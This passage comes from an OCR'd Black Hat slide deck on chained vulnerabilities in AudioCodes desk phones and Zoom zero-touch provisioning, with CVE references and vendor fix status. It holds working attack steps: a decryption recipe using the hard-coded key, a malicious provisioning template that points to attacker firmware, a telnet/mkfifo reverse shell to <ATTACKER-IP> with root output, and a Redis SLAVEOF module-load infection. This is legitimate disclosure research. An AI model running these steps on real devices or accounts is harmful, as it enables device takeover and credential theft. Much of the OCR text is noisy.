bl <EXTERNAL>: :EVP_BytesToKey
```

## Slide 71

#BHUSA @BlackHatEvents

Source: https://www.openssl.org/docs/man3.1/man3/EVP_BytesToKey.html


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
EVP_BytesToKey
NAME
EVP BytesToKey - password based encryption routine
SYNOPSIS
DESCRIPTION
EVP BytesToKey() derives a key and IV from various parameters. type is the cipher to derive the
key and IV for. md is the message digest to use. The salt parameter is used as a salt in the
derivation: it should point to an 8 byte buffer or NULL if no salt is used. data is a buffer
containing datal bytes which is used to derive the keying data. count is the iteration count to
use. The derived key and IV will be written to key and iv respectively.
Source: https://www.openssl.org/docs/man3.1/man3/EVP_BytesToKey.html
```

## Slide 72

#BHUSA @BlackHatEvents

Source: https://www.openssl.org/docs/man3.1/man3/EVP_BytesToKey.html


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
EVP_BytesToKey
NAME
EVP BytesToKey - password based encryption routine
SYNOPSIS
DESCRIPTION
EVP BytesToKey() derives a key and IV from various parameters. type is the cipher to derive the
key and IV for. md is the message digest to use. The salt parameter is used as a salt in the
derivation: it should point to an 8 byte buffer or NULL if no salt is used. data is a buffer
containing datal bytes which is used to derive the keying data. count is the iteration count to
use. The derived key and IV will be written to key and iv respectively.
Source: https://www.openssl.org/docs/man3.1/man3/EVP_BytesToKey.html
```

## Slide 73

#BHUSA @BlackHatEvents

## Slide 74

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
$ offset=$(python3 -c ‘'print(int("@0@@le8f", base=16))')
$ dd skip=$offset count=64 if=decryption_tool of=secret.bin bs=1
```

## Slide 75

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 73/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
#00111b8 a4 fe ff eb bl <EXTERNAL>: :EVP_des_ede3_cbe
```

## Slide 76

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
$ secret=$(cat secret.bin)
$ openssl enc -des-ede3-cbc -P -pass pass:$secret -nosalt
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
$ openssl enc -d -des-ede3-cbc -pass pass:$secret -nosalt \
-in encrypted_config.cfx -out plain_config.cfg
$ cat plain_config.cfg
voip/line/@/enabled=1
voip/line/@/id=123
voip/line/@/auth_password=XYZ
```

## Slide 77

#### AudioCodes Administrator Manual

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
28.1 Encrypting Configuration Files
This procedure describes how to encrypt the Configuration file. For example, you may wish
to encrypt the configuration file when it is send over an unsecure network.
» To encrypt the configuration file:
@ Atthe command line prompt, specify the following:
encryption tool.exe -f <filename>.cfg
where <file name>.cfg specifies the name of the Configuration file that you wish to
encrypt.
Once the Configuration file is encrypted, it receives the suffix ‘.cfx’ (e.g. Conf.cfx). This
is the file that you should specify in the ‘Configuration URL’ and the ‘Dynamic
Configuration URL’ fields when performing automatic provisioning (see Part II
‘Automatic Provisioning’).
AudioCodes Administrator Manual
```

## Slide 78

## SYSS-2022-054

- SYSS-2022-054

- CVE-2023-22956

- Use of hard-coded Cryptographic Key (CWE-321)

#BHUSA @BlackHatEvents

## Slide 79

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 80

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 81

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
Raw Hex
GET /api/v2/pbx/provisioning/audiocodes/@09038F9D8992.cfg HTTP/2
User-Agent: AUDC/3.4.6.664 AUDC-IPPhone-C45@HD_UC_3.4.6.684/1
Accept: */*
5 Referer: https://provacp.zoom.us/
fos
```

## Slide 82

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Response
Pretty Raw Hex Render
10
11
12
13
14
15
16
HTTP/? 488 Bad Request
Server: nginx
Date: Sat, @1 Jul 2823 69:35:14 GMT
Content-Type: text/html
Content-Length: 238
Strict-Transport-Security: max-age=315360008; includeSubDomains
<html>
<head>
<title>
40@ No required SSL certificate was sent
</title>
</head>
<body>
<center>
40@ Bad Request
</center>
<center>
No required SSL certificate was sent
</center>
<hr>
<center>
nginx
</center>
</body>
</html>
#BHUSA @BlackHatEvents
```

## Slide 83

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 75/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Slaveof\Replicaof Infection Method

TIME
1673347867
SLAVEOF 116.202.102.79 8080
+OK
TIME
1673347888
MODULE LOAD ./temp-1673347866.1.rdb
...
MODULE LOAD ./temp-1673347888.1.rdb
...
-ERR Error loading the extension. Please check the server logs.
+OK
...
rdss 2381675947053628537 id
uid=0(root) gid=0(root) groups=0(root)

Information Classification: General
```

## Slide 84

Source: https://www.audiocodes.com/media/zhre0lg0/c448hd-c450hd-ip-phone-for-microsoft-teams-user-s-and-administrator-s-manual-ver-1-17.pdf

#BHUSA @BlackHatEvents

## Slide 85

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Response
16
Pretty Raw Hex Render
HTTP/2 208 OK
Date: Sat, @1 Jul 2@23 09:37:33 GMT
Content-Type: application/octet-stream
Content-Length: 6992
X-Zm-Region: VA
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Frame-Options: deny
Content-Disposition: attachment; Tilename=@8908F9D8992 .cTg
Accept-Ranges: bytes
Strict-Transport-Security: max-age=31536088@; includeSubDomains
X-Content-Type-Options: nosniff
system/type=C45@HD
voip/dns_cache_srv/@/port=5091
voip/dns_cache_srv/@/priority=1
voip/dns_cache_srv/1/port=5091
```

## Slide 86

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
Raw Hex
1 GET /api/v2/pbx/provisioning/ audiocodes
2 Host: eu@lpbxacp.zoom.us
4 Referer: https://provacp.zoom.us/
User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
```

## Slide 87

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Client_00908F9D8992
Identity: Client_OOS08F9D8992
Verified by: CA_ipp1
Expires: 02/12/2037
Subject Name
© (Organization):
CN (Common Name):
ACL
Issuer Name
© (Organization): ACL
Issued Certificate
Version: 3
Serial Number: @2 @@ 9@ &F 9D 89 92
Not Valid Before: 2017-02-17
Not Valid After: 2037-02-12
```

## Slide 88

### **Pseudo NGINX Configuration**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Pseudo NGINX
Configuration
server
listen 443 ssl
server_name eu@1lpbxacp.zoom.us
ssl_certificate /path/to/server.crt
ssl_certificate_key /path/to/server.key
location /
ssl_client_certificate /path/to/ca.crt
ssl_verify_client on
if ($ssl_client_verify != SUCCESS
return 4@3
# X.509 client serial verification
if ($ssl_client_s_dn !~* "CN=$arg_serial"
return 403
# forward
proxy_pass http://localhost:9080
```

## Slide 89

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 90

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
O
co
IT administrator
ZOOM one and assigns
a configuration template
```

## Slide 91

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Add Device
Display Name
Description
(Optional)
[ John Doe
( John Doe's Phone
MAC Address [ oogosrsase92 )
Assigned to
This device type supports up to 1 assignee.
Assign
Provision
Template
(Optional)
common user template
Save Cancel
```

## Slide 92

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Company Info > Account Settings >» Desk Phone > Provision Template >» common user template
Name f common user template )
Description default template for devices
(Optional)
Save Cancel
Template Visit Support Document for more guidance
| personal_settings/soft_key/O/key_function=DIRECTORY
personal_settings/soft_key/1/key_function=MISSED_CALLS
personal_settings/soft_key/2/key_function=DND_ALL
personal_settings/soft_key/3/key_function=Forward_All
5 personal_settings/soft_key/4/key_function=NONE
Cancel
#BHUSA @BlackHatEvents
```

## Slide 93

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Company Info > Account Settings » Desk Phone > Provision Template > evil configuration template
evil configuration template rename
No description
Template Visit Support Document for more guidance
( | provisioning/Tirmware/url=https://ptma.sy.gs/pbx/AudioCodes_UCC450HD_3.4.8.198.1.img )
2 provisioning/period/type=weekly
3 provisioning/period/weekly/time=00:00
4 provisioning/random_provisioning_time=300
#BHUSA @BlackHatEvents
```

## Slide 94

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 75/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
Pretty Raw Hex
2 Host: euOlpbxacp.zoom.us
4 Accept: */*
Response
Pretty Raw Hex Render
184 voip/line/27/1d=0
196 voip/line/28/1d=0
197 voip/Lline/29/enabled=0a
198 voip/line/29/1d=0
199 voip/services/msg waiting ind/voice mail number=*86
202) provisloning/period/weekLy/time=00: 00
203) provisiloning/random provisioning time=300
```

## Slide 95

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Add Device
Display Name yet another phone
Description
(Optional)
a
MAC Address 00908faaaaaa
Device Type AudioCodes w
c450hd wv
This device type supports up to 1 assignee.
Assigned to Assign
Provision common user template
Template
(Optional)
#BHUSA @BlackHatEvents
```

## Slide 96

### **Before MAC assignment**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
Raw Hex
1 GET /@@988FAAAAAA HTTP/1.1
2 Host: redirect.audiocodes.com
3 Accept: */*
4 User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
5 Connection: close
Before MAC assignment
Response
Pretty Raw Hex
HTTP/1.1 404 Not Found
Content-Length: 62
Connection: close
Date: Thu, @6 Jul 2023 12:16:48 GMT
ca
{
"description": "device MAC @@9@8FAAAAAA was not found"
}
& wo
```

## Slide 97

### **After MAC assignment**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
Raw Hex
1 GET /@@988FAAAAAA HTTP/1.1
2 Host: redirect.audiocodes.com
3 Accept: */*
4 User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
5 Connection: close
After MAC assignment
Response
Raw Hex Render
1 HTTP/1.1 382 Found
2 Content-Length: ©
3 Connection: close
4 Content-Type: text/plain; charset=utf-&8
5 Date: Thu, 866 Jul 2023 12:17:08 GMT
6 Location: https://eu®lpbxacp.zoom.us/api/v2/pbx/provisioning/ audiocodes /
Request-Context: appId=cid-v1:229bb6bd-04d7 -408d-b225-c6e440f5c51b
```

## Slide 98

#BHUSA @BlackHatEvents

## Slide 99

MAC + Config

#BHUSA @BlackHatEvents

## Slide 100

MAC + Config

#BHUSA @BlackHatEvents

## Slide 101

MAC + Config

#BHUSA @BlackHatEvents

## Slide 102

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 103

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Manual firmware upgrade
Configuration | Management # Diagnostics
Please select a file to upgrade.
Firmware File Location: Choose File | AudioCodes....6.604.1.img
+1 | Automatic Update
=| jig) Manual Update vo
Submit
Configuration File
Firmware Upgrade
#1 |) Administration
+ | gj Remote Management
```

## Slide 104

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CC audiocodes
CRC Error
A rade Fail
```

## Slide 105

### /home/ipphone/scripts/run_ramfs_for_upgrade.sh

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[...]
FLASHER=flasher
[...]
do_upgrade() {
v "Performing system upgrade..."
flasher u /tmp upgrade.img
v "external flasher exist"
chmod +x /tmp/flasher_ext
/tmp/flasher_ext u
v "external flasher can run, so use external flasher to upgrade"
FLASHER="/tmp/flasher_ext"
fi
fi
$FLASHER xr /tmp upgrade.img 1>$CONSOLE 2>&1
v "Upgrade successful"
else
v "Upgrade fail"
fi
#BHUSA @BlackHatEvents
```

## Slide 106

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 70/100 on the text kept, 38/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
undefined
indefined lseek_SEEK_SET()
lseek_SEEK_SET
00012b38 68 20 a@ e3
@@012b3c fb f9 Tf ea
mov 12, #0x8
FUN_@@@152b8:
[more]
```

## Slide 107

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
File Edit Search View Format Scripts Templates Debug Project Tools Window Help
A4 39 05 41.17 00 00 00 A& 39 05 41/17 00 00 00 59.A....°9.A..
CO 39 05 41/17 00 00 00'C4 39 05 41 17 00 00 00 AY.A....A9.A..
```

## Slide 108

**Section Magic Bytes Section Header Size**

**Secion Name**

#### **Section Checksum starting at Offset 0x60 (8 Byte alligned)**

#BHUSA @BlackHatEvents

## Slide 109

### Firmware Sections

- Firmware header containing meta information (version, model, date, etc.)

- bootloader.img

- rootfs.ext4

- phone.img

- section.map

- Flasher

- Release

- end.section

#BHUSA @BlackHatEvents

## Slide 110

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
$ 11
total 3/K
drwxr-xr-x
drwxr-xr-
drwxr
drwxr-xr-
drwxr-xr-
drwxr
drwxr-xr-
drwxr-xr-
drwxr-xr-
drwxr-xr-
drwxr
-rwxr
drwxr
drwxr
drwxr-xr-x
-rwxr
drwxr-xr-x
root root
root root
root root
root root
root root
root root
root root
root root
root root
root root
root root
root root
r root
root root .
root root . ! production.cfg
root root :
root root
root root
root root |
root root . .s
root root . j udhcpc.script.option43
root
```

## Slide 111

#BHUSA @BlackHatEvents

## Slide 112

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[admin@C450HD /home/ipphone]# cat /etc/release
;release information
[admin]
AUTOMAKE=1
BUILD_OWNER=centos@ip-172-16-142-244.corp.audiocodes.com
BUILD_PROFILE=C450HD
IMG_BLVERSION=4.0.3
SYSDATETIME=121300002021
VCS=ga46 lba3ee0
[default]
BUILD_TIME=2021-12-13 09:07:38
HW_TYPE=C450HD
LOG=0
SWVERSION=UC 3.4.6.604.1
[admin@C450HD /home/ipphone]# ls -la
total 39
- rwxr-xr-X
drwxr-xr-x
admin root : udhcpc.script
admin root : udhcpc.script.option43
admin root : udhcpc.vlanid ript
admin root
drwxr-xr-x 19 admin root
drwxr-xr-x 4 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 4 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 3 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 4 admin root
drwxr-xr-x 3 admin root
-rwxr-xr-x 1 admin root : ntpser. List
drwxr-xr-x 2 admin root
drwxr-xr-x 6 admin root
-rw-r--r-- 1 admin root : production.cfg
-rwxr-xr-X 1 admin root = rcS
drwxr-xr-x 2 admin root ‘ —
-rw-r--r-- 1 admin root : syss-poc.txt *~ «a
-rwxr-xr-xX 1 admin root - tz.lst 3-9
1
1
1
1
```

## Slide 113

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CC audiocodes
CRC Error
A rade Fail
```

## Slide 114

## SYSS-2022-055

- SYSS-2022-055

- CVE-2023-22955

- Missing Immutable Root of Trust in Hardware (CWE-1326)

#BHUSA @BlackHatEvents

## Slide 115

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
#!/bin/sh
/bin/sleep 120
TF=$(/bin/mktemp -u)
/usr/bin/mkfifo $TF
/usr/bin/telnet <ATTACKER-IP> 5000 @<$TF | /bin/sh 1>$TF
```

## Slide 116

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
L$ ne -lvkp 5000
listening on [any] 5000 ...
connect to | | From .t-ipconnect.de [93.229
id
uid=0(admin) gid=0(root) groups=0(root)
cat /etc/release
;release information
[admin]
AUTOMAKE=1
BUILD OWNER=centos@ip-1/72-16-142-244.corp.audiocodes.com
BUILD PROFILE=C45@HD
IMG_BLVERSION=4.0.3
SYSDATETIME=121300002021
BUILD TIME=2021-12-13 09:07:38
LOG=0
SWVERSION=UC_3.4.6.604.1
```

## Slide 117

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZOOM
1. adds a device and assigns
a configuration template
aa
attacker
```

## Slide 118

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
ZOOM
1. adds a device and assigns
a configuration template
aa
attacker
```

## Slide 119

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
desk phone the provisioning and configuration
— server for the added device
ZOOM
1. adds a device and assigns
a configuration template
aa
attacker
```

## Slide 120

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
ZOOM
1. adds a device and assigns
a configuration template
aa
attacker
```

## Slide 121

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
ZOOM
1. adds a device and assigns
a configuration template
aa
attacker
```

## Slide 122

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
ZOOM
1. adds a device and assigns
a configuration template
aa
attacker
```

## Slide 123

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
ZOOM
7. downloads and installs
malicious firmware
1. adds a device and assigns
v a configuration template
controls
attacker
attacker server
```

## Slide 124

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
ZOOM
7. downloads and installs
8. reverse shell
initiated malicious firmware
1. adds a device and assigns
v a configuration template
controls
attacker
attacker server
```

## Slide 125

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ADMIN
Assigned Unassigned
Dashboard
>» User Management
Add Import | Export @
>» Device Management
~ Phone System Management | Q
Users & Rooms
Auto Receptionists
Call Queues
Shared Lines
Group Call Pickup
Phone Numbers
Provider Exchange
Phones & Devices
Assets Library
Logs
#BHUSA @BlackHatEvents
```

## Slide 126

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Import
Batch import unassigned Desk Phones.
Uploading
Running in the Background
10%
```

## Slide 127

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
=] Desk Phone
=] Desk Phone
=] Desk Phone
=] Desk Phone
| Desk Phone
| Desk Phone
| Desk Phone
| Desk Phone
| Desk Phone
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
00-90-8f-9d-b3-04
00-90-8f-9d-b3-05
00-90-8f-9d-b3-06
00-90-8f-9d-b3-09
00-90-8f-9d-b3-08
00-90-8f-9d-b3-Ob
00-90-8f-9d-b3-Of
Page 1
of 18
}
Total 256
```

## Slide 128

## SYSS-2022-056

- SYSS-2022-056

- Unverified Ownership (CWE-283)

#BHUSA @BlackHatEvents

## Slide 129

#BHUSA @BlackHatEvents

## Slide 130

#BHUSA @BlackHatEvents

## Slide 131

#BHUSA @BlackHatEvents

## Slide 132

#BHUSA @BlackHatEvents

## Slide 133

#BHUSA @BlackHatEvents

## Slide 134

#BHUSA @BlackHatEvents

## Slide 135

#BHUSA @BlackHatEvents

## Slide 136

## Hard-coded cryptographic Key

SYSS-2022-052 (CVE-2023-22957) & SYSS-2022-054 (CVE-2023-22956):

- State: fixed

- Initial vendor notification: November 2022

#BHUSA @BlackHatEvents

## Slide 137

## Missing immutable Root of Trust

SYSS-2022-055 (CVE-2023-22955):

- State: not fixed

- Initial vendor notification: November 2022

- Vendor response:

- _„AudioCodes 2023 roadmap includes signing of firmware for UC devices.”_

#BHUSA @BlackHatEvents

## Slide 138

### Exposure of sensitive Information to an unauthorized Actor

SYSS-2022-052:

- State: partially fixed

- Initial vendor notification: November 2022

#BHUSA @BlackHatEvents

## Slide 139

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Product Notice #0503
Mutual TLS Authentication (mTLS) Support
for AudioCodes Redirect Service
This Product Notice announces the support of Mutual TLS Authentication (mTLS) for
AudioCodes Redirect Service.
mTLS ensures that both the Redirect server and the device (client) authenticate each other's identities before
establishing a connection. This additional layer of authentication safeguards against unauthorized access,
strengthening the overall security of AudioCodes Redirect Service.
Note: By default, mTLS is disabled, allowing currently deployed devices that may not possess the appropriate
certificates to continue accessing and using the Redirect Service. However, we recommend that Customers enable
#BHUSA @BlackHatEvents
```

## Slide 140

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Note: By default, mTLS is disabled, allowing currently deployed devices that may not possess the appropriate
certificates to continue accessing and using the Redirect Service. However, we recommend that Customers enable
mTLS.
#BHUSA @BlackHatEvents
```

## Slide 141

## Unverified Ownership

SYSS-2022-056:

- State: partially fixed

- Initial vendor notification: November 2022

#BHUSA @BlackHatEvents

## Slide 142

## Recommendations

- Check Redirections

- Limit Network Communications

#BHUSA @BlackHatEvents

## Slide 143

## Conclusion

Phone

Hard-coded cryptographic Key Missing immutable Root of Trust

Vendor
Redirect Server

Exposure of sensitive Information to an unauthorized Actor

Unverified Ownership

#BHUSA @BlackHatEvents

## Slide 144

## Black Hat Sound Bytes

#BHUSA @BlackHatEvents

## Slide 145

## Black Hat Sound Bytes

Insufficient security level of e.g. Desk Phones

#BHUSA @BlackHatEvents

## Slide 146

## Black Hat Sound Bytes

Insufficient security level of e.g. Desk Phones Endpoint Provisioning is a lucrative Target for Attackers

#BHUSA @BlackHatEvents

## Slide 147

## Black Hat Sound Bytes

Insufficient security level of e.g. Desk Phones Endpoint Provisioning is a lucrative Target for Attackers Combine Vulnerabilities FTW!

#BHUSA @BlackHatEvents

## Slide 148

## Thanks!

#### Moritz Abrell

- @moritz_abrell

<u>https://blog.syss.com/posts/zero-touch-pwn/</u>

- SYSS-2022-052 // CVE-2023-22957

- SYSS-2022-053

- SYSS-2022-054 // CVE-2023-22956

- SYSS-2022-055 // CVE-2023-22955

- SYSS-2022-056

#BHUSA @BlackHatEvents
